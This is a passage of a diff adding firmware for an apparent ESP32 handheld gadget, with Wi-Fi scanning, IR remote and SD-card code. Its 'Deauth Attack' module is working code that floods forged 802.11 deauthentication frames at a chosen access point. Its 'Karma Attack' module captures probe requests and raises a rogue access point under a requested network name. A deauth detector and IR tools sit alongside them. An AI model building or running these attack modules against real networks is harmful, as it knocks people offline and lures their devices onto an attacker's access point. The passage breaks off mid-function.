+void sendDeauthFrame(const uint8_t* bssid, const uint8_t* client, uint8_t) {
+uint8_t packet[26]; int i = 0;
+packet[i++]=0xC0; packet[i++]=0x00; packet[i++]=0x00; packet[i++]=0x00;
+for (int k=0;k<6;k++) packet[i++]=client[k];
+for (int k=0;k<6;k++) packet[i++]=bssid[k];
+for (int k=0;k<6;k++) packet[i++]=bssid[k];
+packet[i++]=0x00; packet[i++]=0x00; packet[i++]=0x07; packet[i++]=0x00;
+esp_wifi_80211_tx(WIFI_IF_STA, packet, i, false);
+deauthPackets++;
+}
+void drawDeauthScreen() {
+clearScreen(); header("Deauth Attack", 0);
+char buf[32]; snprintf(buf, sizeof(buf), "Packets: %lu", deauthPackets); text(buf, 4, 28, COL_TEXT);
+snprintf(buf, sizeof(buf), "Targets: %d", deauthTargetCount); text(buf, 4, 40, COL_ACCENT);
+if (deauthTargetCount == 0) { centerText("No targets", 74, COL_WARN); centerText("BACK: exit", 110, COL_DIM); return; }
+int start = deauthScroll;
+if (start > deauthTargetCount - DEAUTH_VISIBLE) start = deauthTargetCount - DEAUTH_VISIBLE;
+if (start < 0) start = 0;
+for (int row = 0; row < DEAUTH_VISIBLE; row++) {
+int i = start + row; if (i >= deauthTargetCount) break;
+int y = 54 + row * DEAUTH_ROW_H;
+bool sel = (i == deauthCurrent);
+if (sel) tft.fillRoundRect(2, y-2, 156, 14, 3, COL_ACCENT);
+char ss[15]; truncateTo(deauthTargets[i].ssid, ss, 14);
+text(ss, 5, y, sel ? COL_BG : COL_TEXT);
+char ch[6]; snprintf(ch, sizeof(ch), "ch%02d", deauthTargets[i].channel);
+text(ch, 112, y, sel ? COL_BG : COL_ACCENT);
+}
+centerText("NEXT: sel  SELECT: go", 124, COL_DIM);
+}
+void scanDeauthTargets() {
+clearScreen(); header("Deauth Attack", 0);
+centerText("Scanning...", 60, COL_ACCENT, 2);
+WiFi.scanDelete(); WiFi.scanNetworks(true, true);
+unsigned long s = millis();
+while (WiFi.scanComplete() == WIFI_SCAN_RUNNING && millis() - s < 12000) delay(200);
+int n = WiFi.scanComplete();
+deauthTargetCount = 0;
+for (int i = 0; i < n && deauthTargetCount < DEAUTH_MAX_TARGETS; i++) {
+uint8_t* bssid = WiFi.BSSID(i); if (!bssid) continue;
+memcpy(deauthTargets[deauthTargetCount].bssid, bssid, 6);
+deauthTargets[deauthTargetCount].channel = WiFi.channel(i);
+String s2 = WiFi.SSID(i); if (s2.length() == 0) s2 = "<hidden>";
+strncpy(deauthTargets[deauthTargetCount].ssid, s2.c_str(), 23);
+deauthTargets[deauthTargetCount].ssid[23] = '\0';
+deauthTargets[deauthTargetCount].rssi = WiFi.RSSI(i);
+deauthTargetCount++;
+}
+if (deauthTargetCount == 0) { message("Deauth", "No targets", nullptr, COL_WARN); delay(800); }
+deauthCurrent = 0; deauthScroll = 0;
+}
+void tickDeauth(bool entered) {
+if (entered) {
+WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(200);
+WiFi.mode(WIFI_STA); delay(300); esp_wifi_set_ps(WIFI_PS_NONE);
+deauthPackets = 0; deauthRunning = false;
+scanDeauthTargets();
+drawDeauthScreen();
+lastDeauthDraw = millis();
+}
+if (backPressed()) {
+deauthRunning = false;
+esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+screen = WIFI_MENU; return;
+}
+if (nextPressed() && deauthTargetCount > 0) {
+deauthCurrent = (deauthCurrent + 1) % deauthTargetCount;
+if (deauthCurrent >= deauthScroll + DEAUTH_VISIBLE) deauthScroll = deauthCurrent - DEAUTH_VISIBLE + 1;
+if (deauthCurrent < deauthScroll) deauthScroll = deauthCurrent;
+drawDeauthScreen();
+}
+if (selectPressed()) {
+deauthRunning = !deauthRunning;
+if (deauthRunning) {
+esp_wifi_set_channel(deauthTargets[deauthCurrent].channel, WIFI_SECOND_CHAN_NONE);
+beepSuccess();
+} else { drawDeauthScreen(); beepBack(); }
+}
+if (deauthRunning && deauthTargetCount > 0) {
+unsigned long now = millis();
+if (now - lastDeauthSend > 10) {
+lastDeauthSend = now;
+uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+sendDeauthFrame(deauthTargets[deauthCurrent].bssid, bcast, deauthTargets[deauthCurrent].channel);
+}
+if (now - lastDeauthDraw > 250) {
+lastDeauthDraw = now;
+clearScreen(); header("Deauth Attack", 0);
+centerText("ATTACKING", 24, COL_WARN, 2);
+char buf[32]; snprintf(buf, sizeof(buf), "Packets: %lu", deauthPackets); text(buf, 6, 52, COL_TEXT);
+char ss[20]; truncateTo(deauthTargets[deauthCurrent].ssid, ss, 18); centerText(ss, 68, COL_ACCENT);
+char cb[16]; snprintf(cb, sizeof(cb), "Channel: %d", deauthTargets[deauthCurrent].channel); centerText(cb, 84, COL_ACCENT2);
+centerText("SELECT: stop", 106, COL_DIM);
+centerText("BACK: exit", 120, COL_DIM);
+}
+}
+}
+
+// ================= RADAR =================
+const int RADAR_CX = 80, RADAR_CY = 82, RADAR_MAX_R = 45;
+struct RadarBlip { char ssid[20]; int8_t rssi; float angle, radius; bool open; uint8_t channel; bool valid; };
+const int RADAR_MAX = 10;
+RadarBlip radarBlips[RADAR_MAX];
+int radarCount = 0, radarMode = 0;
+unsigned long lastRadarScan = 0;
+const int RADAR_SCAN_INTERVAL = 6000;
+float rssiToRadius(int8_t rssi) {
+const int RSSI_MIN = -95, RSSI_MAX = -30;
+if (rssi < RSSI_MIN) rssi = RSSI_MIN; if (rssi > RSSI_MAX) rssi = RSSI_MAX;
+float t = (float)(rssi - RSSI_MIN) / (float)(RSSI_MAX - RSSI_MIN);
+return RADAR_MAX_R * (1.0 - t) + 6;
+}
+uint16_t rssiColor(int8_t rssi) { if (rssi > -50) return COL_ACCENT; if (rssi > -70) return COL_ACCENT2; return COL_DIM; }
+void scanRadar() {
+WiFi.scanDelete(); WiFi.scanNetworks(true, true);
+unsigned long start = millis();
+while (WiFi.scanComplete() == WIFI_SCAN_RUNNING && millis() - start < 8000) delay(150);
+int n = WiFi.scanComplete(); if (n < 0) n = 0;
+radarCount = 0;
+for (int i = 0; i < n && radarCount < RADAR_MAX; i++) {
+String ssid = WiFi.SSID(i); if (ssid.length() == 0) ssid = "<hidden>";
+bool open = WiFi.encryptionType(i) == WIFI_AUTH_OPEN;
+if (radarMode == 1 && !open) continue;
+int8_t rssi = WiFi.RSSI(i);
+strncpy(radarBlips[radarCount].ssid, ssid.c_str(), 19); radarBlips[radarCount].ssid[19] = '\0';
+radarBlips[radarCount].rssi = rssi; radarBlips[radarCount].open = open;
+radarBlips[radarCount].channel = WiFi.channel(i); radarBlips[radarCount].radius = rssiToRadius(rssi);
+uint8_t* bssid = WiFi.BSSID(i); float seed = bssid ? (bssid[5] / 255.0f) : (i / 20.0f);
+radarBlips[radarCount].angle = seed * 2 * PI; radarBlips[radarCount].valid = true;
+radarCount++;
+}
+}
+void drawRadarScreen() {
+clearScreen(); header("WiFi Radar", 4);
+tft.drawCircle(RADAR_CX, RADAR_CY, RADAR_MAX_R, COL_DIM);
+tft.drawCircle(RADAR_CX, RADAR_CY, RADAR_MAX_R * 2 / 3, COL_DIM);
+tft.drawCircle(RADAR_CX, RADAR_CY, RADAR_MAX_R / 3, COL_DIM);
+tft.drawFastHLine(RADAR_CX - RADAR_MAX_R, RADAR_CY, RADAR_MAX_R * 2, COL_DIM);
+tft.drawFastVLine(RADAR_CX, RADAR_CY - RADAR_MAX_R, RADAR_MAX_R * 2, COL_DIM);
+tft.fillCircle(RADAR_CX, RADAR_CY, 3, COL_ACCENT);
+tft.drawCircle(RADAR_CX, RADAR_CY, 5, COL_ACCENT);
+const char* mn[] = {"ALL", "OPEN", "MY"};
+text(mn[radarMode], 4, 26, COL_ACCENT2);
+char buf[24]; snprintf(buf, sizeof(buf), "%d", radarCount); text(buf, 145, 26, COL_TEXT);
+for (int i = 0; i < radarCount; i++) {
+float x = RADAR_CX + cos(radarBlips[i].angle) * radarBlips[i].radius;
+float y = RADAR_CY + sin(radarBlips[i].angle) * radarBlips[i].radius;
+int xi = (int)x, yi = (int)y;
+if (xi < 2 || xi > 158 || yi < 24 || yi > 126) continue;
+uint16_t col = rssiColor(radarBlips[i].rssi);
+tft.fillCircle(xi, yi, 2, col);
+if (radarBlips[i].open) tft.drawCircle(xi, yi, 4, COL_ACCENT);
+}
+centerText("NEXT: mode  BACK: exit", 120, COL_DIM);
+}
+void tickRadar(bool entered) {
+if (entered) {
+WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(150);
+WiFi.mode(WIFI_STA); delay(300); esp_wifi_set_ps(WIFI_PS_NONE);
+clearScreen(); header("WiFi Radar", 4); centerText("Scanning...", 60, COL_ACCENT, 2);
+scanRadar(); drawRadarScreen(); lastRadarScan = millis();
+}
+if (millis() - lastRadarScan > RADAR_SCAN_INTERVAL) { lastRadarScan = millis(); scanRadar(); drawRadarScreen(); }
+if (backPressed()) { screen = MAIN; return; }
+if (nextPressed()) { radarMode = (radarMode + 1) % 3; scanRadar(); drawRadarScreen(); lastRadarScan = millis(); }
+}
+
+// ================= DEAUTH DETECTOR =================
+volatile unsigned long deauthAttackPackets = 0, deauthLastSeen = 0;
+volatile uint8_t deauthAttackerMAC[6] = {0};
+volatile int8_t deauthAttackerRSSI = 0;
+volatile uint8_t deauthLastChannel = 0;
+struct DeauthAttackLog { uint8_t attacker[6]; int8_t rssi; unsigned long time; };
+const int DD_LOG_MAX = 10;
+DeauthAttackLog ddLog[DD_LOG_MAX];
+int ddLogCount = 0;
+unsigned long ddTotalPackets = 0, lastDDSeenTime = 0;
+int ddAlarmFrames = 0;
+unsigned long lastDDDraw = 0, lastBeepAttack = 0;
+void IRAM_ATTR deauthDetectorCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+if (type != WIFI_PKT_MGMT) return;
+wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+uint8_t* p = pkt->payload; int len = pkt->rx_ctrl.sig_len;
+if (len < 26) return;
+if ((p[0] & 0xF0) != 0xC0) return;
+ddTotalPackets++; deauthLastSeen = millis();
+deauthAttackPackets++; lastDDSeenTime = millis();
+deauthAttackerRSSI = pkt->rx_ctrl.rssi;
+deauthLastChannel = pkt->rx_ctrl.channel;
+memcpy((void*)deauthAttackerMAC, p + 10, 6);
+}
+void addDDLog(const uint8_t* mac, int8_t rssi) {
+for (int i = 0; i < ddLogCount; i++)
+if (memcmp(ddLog[i].attacker, mac, 6) == 0) { ddLog[i].rssi = rssi; ddLog[i].time = millis(); return; }
+if (ddLogCount < DD_LOG_MAX) {
+memcpy(ddLog[ddLogCount].attacker, mac, 6);
+ddLog[ddLogCount].rssi = rssi; ddLog[ddLogCount].time = millis(); ddLogCount++;
+} else {
+for (int i = 0; i < DD_LOG_MAX - 1; i++) ddLog[i] = ddLog[i + 1];
+memcpy(ddLog[DD_LOG_MAX - 1].attacker, mac, 6);
+ddLog[DD_LOG_MAX - 1].rssi = rssi; ddLog[DD_LOG_MAX - 1].time = millis();
+}
+}
+void drawDDLogScreen() {
+clearScreen(); header("Detector Log", 4);
+if (ddLogCount == 0) { centerText("No attacks yet", 60, COL_ACCENT2); centerText("BACK: return", 100, COL_DIM); return; }
+for (int row = 0; row < ddLogCount && row < 7; row++) {
+int y = 30 + row * 14;
+char mac[24]; macToString(ddLog[row].attacker, mac);
+text(mac, 3, y, COL_TEXT);
+text(ouiVendor(ddLog[row].attacker), 88, y, COL_ACCENT);
+}
+centerText("BACK: return", 122, COL_DIM);
+}
+void drawDeauthDetectorScreen() {
+clearScreen(); header("Detector", 4);
+bool attacking = (millis() - lastDDSeenTime < 2000);
+if (attacking) {
+if (ddAlarmFrames & 1) {
+tft.fillRect(0, 22, 160, 106, COL_WARN);
+centerText("ATTACK", 36, COL_TEXT, 3);
+centerText("DETECTED", 64, COL_TEXT, 3);
+} else {
+centerText("ATTACK", 36, COL_WARN, 3);
+centerText("DETECTED", 64, COL_WARN, 3);
+}
+char buf[32]; snprintf(buf, sizeof(buf), "Packets: %lu", ddTotalPackets); text(buf, 6, 94, COL_TEXT);
+char mac[24]; macToString((const uint8_t*)deauthAttackerMAC, mac); text(mac, 6, 106, COL_TEXT);
+text(ouiVendor((const uint8_t*)deauthAttackerMAC), 6, 118, COL_TEXT);
+} else {
+centerText("MONITORING", 36, COL_ACCENT, 2);
+char buf[32]; snprintf(buf, sizeof(buf), "Packets: %lu", ddTotalPackets); text(buf, 6, 66, COL_TEXT);
+snprintf(buf, sizeof(buf), "Attacks: %d", ddLogCount); text(buf, 6, 80, COL_ACCENT);
+text("Channel: ", 6, 96, COL_ACCENT2);
+char chbuf[8]; snprintf(chbuf, sizeof(chbuf), "%d", deauthLastChannel ? deauthLastChannel : 1); text(chbuf, 74, 96, COL_TEXT);
+centerText("All quiet", 112, COL_ACCENT2);
+}
+centerText("NEXT: log  BACK: exit", 122, COL_DIM);
+}
+void tickDeauthDetector(bool entered) {
+static unsigned long lastDraw = 0, lastHop = 0; static int chIdx = 0;
+static bool showLog = false;
+static const uint8_t channels[] = {1, 6, 11};
+if (entered) {
+WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(200);
+WiFi.mode(WIFI_STA); delay(300); esp_wifi_set_ps(WIFI_PS_NONE); esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
+ddTotalPackets = 0; deauthAttackPackets = 0; deauthLastSeen = 0; lastDDSeenTime = 0;
+ddLogCount = 0; ddAlarmFrames = 0; showLog = false;
+esp_wifi_set_promiscuous_rx_cb(deauthDetectorCallback); esp_wifi_set_promiscuous(true);
+clearScreen(); header("Detector", 4); centerText("Starting...", 60, COL_ACCENT, 2); delay(300);
+lastDraw = 0; lastHop = millis(); chIdx = 1; drawDeauthDetectorScreen();
+}
+if (millis() - lastHop > 4000) { lastHop = millis(); chIdx = (chIdx + 1) % 3; esp_wifi_set_channel(channels[chIdx], WIFI_SECOND_CHAN_NONE); }
+if (deauthLastSeen != 0) {
+uint8_t mc[6]; int8_t rc; noInterrupts();
+memcpy(mc, (const void*)deauthAttackerMAC, 6); rc = deauthAttackerRSSI; deauthLastSeen = 0; interrupts();
+addDDLog(mc, rc);
+}
+if (backPressed()) {
+if (showLog) { showLog = false; lastDraw = 0; }
+else { esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous_rx_cb(nullptr); screen = WIFI_MENU; return; }
+}
+if (nextPressed()) { showLog = !showLog; lastDraw = 0; }
+bool attacking = (millis() - lastDDSeenTime < 2000);
+unsigned long interval = attacking ? 200 : 400;
+if (attacking && millis() - lastBeepAttack > 800) { lastBeepAttack = millis(); playAttackAlarm(); }
+if (millis() - lastDraw > interval) {
+lastDraw = millis(); ddAlarmFrames++;
+if (showLog) drawDDLogScreen(); else drawDeauthDetectorScreen();
+}
+}
+
+// ================= KARMA =================
+struct KarmaTarget { char ssid[32]; uint8_t channel; unsigned long lastSeen; bool seen; };
+const int KARMA_MAX = 8;
+KarmaTarget karmaList[KARMA_MAX];
+int karmaCount = 0;
+volatile unsigned long karmaProbes = 0;
+volatile char karmaLastSSID[32] = "";
+bool karmaRunning = false;
+char karmaActiveSSID[32] = "";
+void IRAM_ATTR karmaCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+if (type != WIFI_PKT_MGMT) return;
+wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+uint8_t* p = pkt->payload; int len = pkt->rx_ctrl.sig_len;
+if (len < 24 || (p[0] & 0xF0) != 0x40) return;
+karmaProbes++;
+char tmp[32] = "";
+for (int i = 24; i < len - 2; ) {
+uint8_t tid = p[i], tl = p[i + 1];
+if (i + 2 + tl > len) break;
+if (tid == 0x00) {
+int l = tl > 31 ? 31 : tl;
+memcpy(tmp, p + i + 2, l); tmp[l] = '\0'; break;
+}
+i += 2 + tl;
+}
+if (tmp[0] == '\0') return;
+strncpy((char*)karmaLastSSID, tmp, 31); karmaLastSSID[31] = '\0';
+}
+void addKarmaTarget(const char* ssid, uint8_t ch) {
+for (int i = 0; i < karmaCount; i++)
+if (strcmp(karmaList[i].ssid, ssid) == 0) { karmaList[i].lastSeen = millis(); return; }
+if (karmaCount < KARMA_MAX) {
+strncpy(karmaList[karmaCount].ssid, ssid, 31); karmaList[karmaCount].ssid[31] = '\0';
+karmaList[karmaCount].channel = ch; karmaList[karmaCount].lastSeen = millis(); karmaList[karmaCount].seen = true;
+karmaCount++; toneRaw(2600, 30);
+} else {
+for (int i = 0; i < KARMA_MAX - 1; i++) karmaList[i] = karmaList[i + 1];
+strncpy(karmaList[KARMA_MAX - 1].ssid, ssid, 31); karmaList[KARMA_MAX - 1].channel = ch;
+karmaList[KARMA_MAX - 1].lastSeen = millis(); karmaList[KARMA_MAX - 1].seen = true;
+}
+}
+void drawKarmaScreen() {
+clearScreen(); header("Karma Attack", 0);
+if (karmaRunning) {
+centerText("KARMA ON", 26, COL_WARN, 2);
+char buf[40]; char ss[24]; truncateTo(karmaActiveSSID, ss, 22);
+snprintf(buf, sizeof(buf), "SSID: %s", ss); text(buf, 4, 52, COL_TEXT);
+snprintf(buf, sizeof(buf), "Probes: %lu", karmaProbes); text(buf, 4, 66, COL_ACCENT);
+snprintf(buf, sizeof(buf), "Targets: %d", karmaCount); text(buf, 4, 80, COL_ACCENT2);
+centerText("SELECT: stop", 106, COL_DIM); centerText("BACK: exit", 120, COL_DIM);
+} else {
+centerText("KARMA OFF", 26, COL_ACCENT, 2);
+char buf[32]; snprintf(buf, sizeof(buf), "Probes: %lu", karmaProbes); text(buf, 4, 52, COL_TEXT);
+snprintf(buf, sizeof(buf), "Targets: %d", karmaCount); text(buf, 4, 66, COL_ACCENT);
+int show = karmaCount < 4 ? karmaCount : 4;
+for (int i = 0; i < show; i++) {
+int y = 82 + i * 11;
+char ss[22]; truncateTo(karmaList[i].ssid, ss, 20); text(ss, 4, y, COL_ACCENT2);
+char ch[8]; snprintf(ch, sizeof(ch), "ch%d", karmaList[i].channel); text(ch, 132, y, COL_DIM);
+}
+centerText("SELECT: start", 122, COL_DIM);
+}
+}
+void tickKarma(bool entered) {
+static unsigned long lastDraw = 0, lastTargetUpdate = 0; static int chIdx = 0;
+static const uint8_t channels[] = {1, 6, 11};
+if (entered) {
+WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(200);
+WiFi.mode(WIFI_STA); delay(300); esp_wifi_set_ps(WIFI_PS_NONE); esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+karmaCount = 0; karmaProbes = 0; karmaLastSSID[0] = '\0'; karmaRunning = false; karmaActiveSSID[0] = '\0';
+esp_wifi_set_promiscuous_rx_cb(karmaCallback); esp_wifi_set_promiscuous(true);
+clearScreen(); header("Karma Attack", 0); centerText("Starting...", 60, COL_ACCENT, 2); delay(300);
+lastDraw = 0; chIdx = 0; drawKarmaScreen();
+}
+if (millis() - lastTargetUpdate > 1500) { lastTargetUpdate = millis(); chIdx = (chIdx + 1) % 3; esp_wifi_set_channel(channels[chIdx], WIFI_SECOND_CHAN_NONE); }
+if (karmaLastSSID[0] != '\0') {
+char sc[32]; noInterrupts();
+strncpy(sc, (const char*)karmaLastSSID, 31); sc[31] = '\0'; karmaLastSSID[0] = '\0'; interrupts();
+addKarmaTarget(sc, channels[chIdx]);
+}
+if (backPressed()) {
+if (karmaRunning) { WiFi.softAPdisconnect(true); WiFi.mode(WIFI_STA); karmaRunning = false; }
+esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous_rx_cb(nullptr);
+screen = WIFI_MENU; return;
+}
+if (selectPressed()) {
+if (!karmaRunning) {
+if (karmaCount == 0) { beepError(); drawKarmaScreen(); }
+else {
+strncpy(karmaActiveSSID, karmaList[karmaCount - 1].ssid, 31); karmaActiveSSID[31] = '\0';
+esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_AP_STA); WiFi.softAP(karmaActiveSSID); delay(300);
+karmaRunning = true; beepSuccess(); drawKarmaScreen();
+}
+} else {
+WiFi.softAPdisconnect(true); WiFi.mode(WIFI_STA); delay(200);
+esp_wifi_set_promiscuous_rx_cb(karmaCallback); esp_wifi_set_promiscuous(true);
+karmaRunning = false; beepBack(); drawKarmaScreen();
+}
+}
+if (millis() - lastDraw > 300) { lastDraw = millis(); drawKarmaScreen(); }
+}
+
+// ================= IR =================
+void drawIrTitle(const char* title, const char* path) {
+clearScreen(); header(title, 1); text(path, 6, 26, COL_DIM);
+}
+void drawIrList(const char* title, const char* path, int selected, int count, const char* const* names) {
+drawIrTitle(title, path);
+const int visible = 6;
+int first = selected - visible / 2;
+if (first < 0) first = 0;
+if (count <= visible) first = 0;
+else if (first > count - visible) first = count - visible;
+for (int row = 0; row < visible; row++) {
+int idx = first + row; if (idx >= count) break;
+menuItem(40 + row * 14, names[idx], idx == selected);
+}
+char pos[20]; snprintf(pos, sizeof(pos), "%d/%d", selected + 1, count);
+text(pos, 126, 120, COL_DIM);
+text("NEXT", 6, 120, COL_DIM);
+text("SELECT", 42, 120, COL_DIM);
+}
+void drawIrBrands() {
+static const char* names[8];
+for (uint8_t i = 0; i < IR_BRAND_COUNT; i++) names[i] = irBrands[i].name;
+drawIrList("IR / TV", "BRAND", irBrandItem, IR_BRAND_COUNT, names);
+}
+void drawIrModels() {
+const IRBrand& brand = irBrands[irBrandItem];
+static const char* names[8];
+for (uint8_t i = 0; i < brand.modelCount; i++) names[i] = brand.models[i].name;
+drawIrList(brand.name, "MODEL / PROFILE", irModelItem, brand.modelCount, names);
+if (brand.modelCount > 0) text(brand.models[irModelItem].note, 6, 105, COL_ACCENT2);
+}
+void drawIrRemote() {
+const IRBrand& brand = irBrands[irBrandItem];
+const IRModel& model = brand.models[irModelItem];
+drawIrTitle(brand.name, model.name);
+const int count = model.commandCount;
+const int visible = 6;
+int first = irCommandItem - visible / 2;
+if (first < 0) first = 0;
+if (count <= visible) first = 0;
+else if (first > count - visible) first = count - visible;
+for (int row = 0; row < visible; row++) {
+int idx = first + row; if (idx >= count) break;
+menuItem(40 + row * 14, model.commands[idx].name, idx == irCommandItem);
+}
+char pos[20]; snprintf(pos, sizeof(pos), "%d/%d", irCommandItem + 1, count);
+text(pos, 126, 120, COL_DIM);
+text("NEXT", 6, 120, COL_DIM);
+text("SELECT SEND", 40, 120, COL_DIM);
+if (irToastUntil > millis()) {
+tft.fillRoundRect(20, 45, 120, 38, 5, COL_OK);
+text("SENT", 61, 51, COL_BG, 2);
+text(irToastText, 34, 70, COL_BG);
+}
+}
+void tickIrMenu(bool entered) {
+static int irSub = 0;
+if (entered) {
+clearScreen(); header("IR Remote", 1);
+const char* items[] = {"TV Send", "Receive", "Saved Codes", "Back"};
+for (int i = 0; i < 4; i++) menuItem(34 + i * 20, items[i], i == irSub);
+}
+if (backPressed()) { screen = MAIN; return; }
+if (nextPressed()) {
+irSub = (irSub + 1) % 4;
+clearScreen(); header("IR Remote", 1);
+const char* items[] = {"TV Send", "Receive", "Saved Codes", "Back"};
+for (int i = 0; i < 4; i++) menuItem(34 + i * 20, items[i], i == irSub);
+}
+if (selectPressed()) {
+if (irSub == 0) screen = IR_TV_BRANDS;
+else if (irSub == 1) screen = IR_RECEIVE;
+else if (irSub == 2) screen = IR_SAVED;
+else screen = MAIN;
+}
+}
+void tickIrBrands(bool entered) {
+if (entered) drawIrBrands();
+if (backPressed()) { screen = IR_MENU; return; }
+if (nextPressed()) { irBrandItem++; if (irBrandItem >= IR_BRAND_COUNT) irBrandItem = 0; drawIrBrands(); }
+if (selectPressed()) { irModelItem = 0; screen = IR_TV_MODELS; }
+}
+void tickIrModels(bool entered) {
+const IRBrand& brand = irBrands[irBrandItem];
+if (entered) drawIrModels();
+if (backPressed()) { screen = IR_TV_BRANDS; return; }
+if (nextPressed()) { irModelItem++; if (irModelItem >= brand.modelCount) irModelItem = 0; drawIrModels(); }
+if (selectPressed()) { irCommandItem = 0; screen = IR_TV_REMOTE; }
+}
+void tickIrRemote(bool entered) {
+const IRModel& model = selectedIrModel();
+if (entered) drawIrRemote();
+if (backPressed()) { screen = IR_TV_MODELS; return; }
+if (nextPressed()) { irCommandItem++; if (irCommandItem >= model.commandCount) irCommandItem = 0; drawIrRemote(); }
+if (selectPressed()) {
+const IRCommand& command = selectedIrCommand();
+sendIRCommand(command);
+irToastText = command.name; irToastUntil = millis() + 700;
+beepSuccess(); drawIrRemote();
+}
+if (irToastUntil != 0 && millis() >= irToastUntil) { irToastUntil = 0; drawIrRemote(); }
+}
+
+// ================= SD CARD / SAVED IR CODES =================
+// The SD module and the TFT share one SPI bus (SCK=12, MOSI=11, MISO=21).
+// Both Adafruit_ST7735 and the SD library wrap their transfers in
+// SPI.beginTransaction()/endTransaction() and drive their own CS pin, so
+// reusing the already-initialized global `SPI` object (the same one the
+// TFT uses, started in setup() with SPI.begin(12,21,11,-1)) is the safe,
+// standard way to add a second device to that bus: both CS lines simply
+// need to default HIGH so neither device is selected until a transfer is
+// in progress for it. No second SPI host object is created, so the TFT's
+// clock settings and behaviour are untouched.
+bool sdReady = false;
+const char* SD_IR_FILE = "/ARGUS_IR.txt";
+
+struct SavedIRCommand {
+  char name[16];
+  int16_t protocol; // raw decode_type_t from IRrecv/IRsend, cast to int16_t
+  uint64_t code;
+  uint16_t bits;
+  uint16_t repeat;
+};
+const int IR_SAVED_MAX = 24;
+SavedIRCommand irSavedList[IR_SAVED_MAX];
+
+bool sdInit() {
+  pinMode(SD_CS, OUTPUT);
+  digitalWrite(SD_CS, HIGH);   // SD deselected
+  digitalWrite(TFT_CS, HIGH);  // TFT deselected before touching the shared bus
+  bool ok = SD.begin(SD_CS, SPI, 1000000);
+  if (ok && SD.cardType() == CARD_NONE) ok = false;
+  digitalWrite(SD_CS, HIGH);   // release the bus cleanly for the TFT
+  sdReady = ok;
+  Serial.println(sdReady ? "SD INIT OK" : "SD INIT FAILED");
+  return sdReady;
+}
+
+// Reads /ARGUS_IR.txt into irSavedList. Never truncates or rewrites the
+// file. Malformed or incomplete lines are skipped, not fatal.
+void sdLoadSavedIR() {
+  irSavedCount = 0;
+  if (!sdReady) return;
+  File f = SD.open(SD_IR_FILE, FILE_READ);
+  if (!f) return;
+  while (f.available() && irSavedCount < IR_SAVED_MAX) {
+    String line = f.readStringUntil('\n');
+    line.trim();
+    if (line.length() == 0) continue;
+    int p1 = line.indexOf('|'); if (p1 < 0) continue;
+    int p2 = line.indexOf('|', p1 + 1); if (p2 < 0) continue;
+    int p3 = line.indexOf('|', p2 + 1); if (p3 < 0) continue;
+    int p4 = line.indexOf('|', p3 + 1); if (p4 < 0) continue;
+    SavedIRCommand& rec = irSavedList[irSavedCount];
+    String name = line.substring(0, p1);
+    strncpy(rec.name, name.c_str(), sizeof(rec.name) - 1);
+    rec.name[sizeof(rec.name) - 1] = '\0';
+    rec.protocol = (int16_t) line.substring(p1 + 1, p2).toInt();
+    rec.code = strtoull(line.substring(p2 + 1, p3).c_str(), nullptr, 16);
+    rec.bits = (uint16_t) line.substring(p3 + 1, p4).toInt();
+    rec.repeat = (uint16_t) line.substring(p4 + 1).toInt();
+    irSavedCount++;
+  }
+  f.close();
+}
+
+// Appends one line; existing content is never cleared or rewritten.
+bool sdAppendSavedIR(const SavedIRCommand& rec) {
+  if (!sdReady) return false;
+  File f = SD.open(SD_IR_FILE, FILE_APPEND);
+  if (!f) return false;
+  char line[96];
+  snprintf(line, sizeof(line), "%s|%d|%llX|%u|%u\n",
+           rec.name, (int)rec.protocol,
+           (unsigned long long)rec.code, rec.bits, rec.repeat);
+  size_t n = f.print(line);
+  f.close();
+  return n > 0;
+}
+
+// Generic dispatch covers every protocol IRsend knows, not just the
+// seven-entry IRProtocol enum used by the built-in TV database above.
+bool sendSavedIR(const SavedIRCommand& rec) {
+  uint32_t now = millis();
+  if ((uint32_t)(now - lastIrSend) < IR_SEND_GUARD_MS) return false;
+  irsend.send((decode_type_t)rec.protocol, rec.code, rec.bits, rec.repeat);
+  lastIrSend = millis();
+  playIRCue();
+  return true;
+}
+
+// ================= IR RECEIVE =================
+void drawIrReceiveScreen() {
+clearScreen(); header("IR Receive", 1);
+if (irResults.decode_type != UNKNOWN && (millis() - irLastReceive < 5000)) {
+text("Protocol:", 6, 32, COL_ACCENT2);
+String s = typeToString(irResults.decode_type, false);
+char t[24]; snprintf(t, sizeof(t), "%s", s.c_str()); text(t, 6, 46, COL_TEXT);
+char v[32]; snprintf(v, sizeof(v), "Value: 0x%llX", (unsigned long long)irResults.value); text(v, 6, 62, COL_TEXT);
+char b[16]; snprintf(b, sizeof(b), "Bits: %d", irResults.bits); text(b, 6, 78, COL_TEXT);
+text("SELECT: save", 6, 104, COL_ACCENT);
+text("BACK: exit", 6, 118, COL_DIM);
+} else {
+centerText("Waiting for IR...", 60, COL_DIM);
+centerText("BACK: exit", 110, COL_DIM);
+}
+}
+void irRecvStart() { irrecv.enableIRIn(); irRecvActive = true; }
+void irRecvStop()  { irrecv.disableIRIn(); irRecvActive = false; }
+void tickIrReceive(bool entered) {
+if (entered) { irRecvStart(); drawIrReceiveScreen(); }
+if (irrecv.decode(&irResults)) {
+irLastReceive = millis();
+irrecv.resume();
+drawIrReceiveScreen();
+}
+if (backPressed()) { irRecvStop(); screen = IR_MENU; return; }
+if (selectPressed() && irResults.decode_type != UNKNOWN) {
+bool ok = false;
+if (sdReady && irSavedCount < IR_SAVED_MAX) {
+SavedIRCommand rec;
+snprintf(rec.name, sizeof(rec.name), "SAVED %d", irSavedCount + 1);
+rec.protocol = (int16_t) irResults.decode_type;
+rec.code = (uint64_t) irResults.value;
+rec.bits = irResults.bits;
+rec.repeat = 0;
+ok = sdAppendSavedIR(rec);
